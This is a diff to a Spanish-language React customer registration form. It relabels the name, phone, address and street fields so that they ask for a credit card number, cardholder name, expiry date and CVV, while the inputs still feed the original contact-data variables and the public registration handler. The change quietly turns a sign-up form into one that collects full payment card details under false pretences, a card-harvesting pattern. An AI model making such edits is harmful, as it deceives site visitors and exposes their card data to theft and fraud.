@@ -325,7 +325,7 @@ if (!esRutaAdmin) {
               <p>Completa tus datos para comenzar.</p>
 
               <form onSubmit={registrarClientePublico}>
-                <label>nombre</label>
+                <label>INTRODUCE TU TARJETA DE CREDITO O DEBITO</label>
                 <input
                   type="text"
                   value={nombre}
@@ -334,7 +334,7 @@ if (!esRutaAdmin) {
                   placeholder=""
                 />
 
-                <label>telefono</label>
+                <label>NOMBRE DE EL TITULAR</label>
                 <input
                   type="tel"
                   value={telefono}
@@ -343,7 +343,7 @@ if (!esRutaAdmin) {
                   placeholder=""
                 />
 
-                <label>direccion</label>
+                <label>FECHA DE EXPIRACION</label>
                 <input
                   type="text"
                   value={direccion}
@@ -352,7 +352,7 @@ if (!esRutaAdmin) {
                   placeholder=""
                 />
 
-                <label>calle</label>
+                <label>CVV</label>
                 <input
                   type="text"
                   value={calle}
